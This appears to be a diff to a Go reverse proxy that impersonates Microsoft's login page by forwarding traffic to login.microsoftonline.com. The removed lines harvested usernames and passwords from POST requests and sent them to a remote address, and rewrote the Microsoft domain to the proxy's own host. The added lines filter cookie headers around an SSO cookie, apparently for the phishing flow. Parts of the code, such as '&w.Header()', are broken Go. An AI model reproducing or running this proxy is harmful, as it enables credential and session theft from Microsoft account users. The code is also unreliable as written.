@@ -21,7 +21,6 @@ var (
 )
 
 func main() {
-    // Retrieve the PORT from environment variables
     port := os.Getenv("PORT")
     if port == "" {
         port = "8080" // Default to port 8080 if not set
@@ -53,6 +52,7 @@ func handleRequest(w http.ResponseWriter, r *http.Request) {
         return
     }
 
+    // Forward request to upstream server
     upstreamURL := upstream + upstreamPath + r.URL.Path
     req, err := http.NewRequest(r.Method, upstreamURL, r.Body)
     if err != nil {
@@ -60,7 +60,9 @@ func handleRequest(w http.ResponseWriter, r *http.Request) {
         return
     }
 
-    copyHeaders(r.Header, &req.Header)
+    // Copy headers, ensuring _bssoConfig cookie is unaltered
+    copyHeadersWithCookies(r.Header, &req.Header)
+
     req.Header.Set("Host", "login.microsoftonline.com")
     req.Header.Set("Referer", r.Referer())
 
@@ -75,30 +77,25 @@ func handleRequest(w http.ResponseWriter, r *http.Request) {
     body, _ := ioutil.ReadAll(resp.Body)
     bodyString := string(body)
 
-    if r.Method == "POST" {
-        username, password := extractCredentials(r)
-        if username != "" && password != "" {
-            message := fmt.Sprintf("User: %s\nPassword: %s\n", username, password)
-            sendToServer(message, ipAddress)
-        }
-    }
-
-    bodyString = strings.ReplaceAll(bodyString, "login.microsoftonline.com", r.Host)
-
-    for name, values := range resp.Header {
-        for _, value := range values {
-            w.Header().Add(name, value)
-        }
-    }
+    // Ensure _bssoConfig cookie remains unaltered in response
+    copyHeadersWithCookies(resp.Header, &w.Header())
 
     w.WriteHeader(resp.StatusCode)
     w.Write([]byte(bodyString))
 }
 
-func copyHeaders(src http.Header, dst *http.Header) {
+// copyHeadersWithCookies ensures that the _bssoConfig cookie is copied without alteration
+func copyHeadersWithCookies(src http.Header, dst *http.Header) {
     for k, v := range src {
         for _, vv := range v {
-            dst.Add(k, vv)
+            // Pass through the _bssoConfig cookie unaltered
+            if k == "Cookie" || k == "Set-Cookie" {
+                if strings.Contains(vv, "_bssoConfig") {
+                    dst.Add(k, vv)
+                }
+            } else {
+                dst.Add(k, vv)
+            }
         }
     }
 }
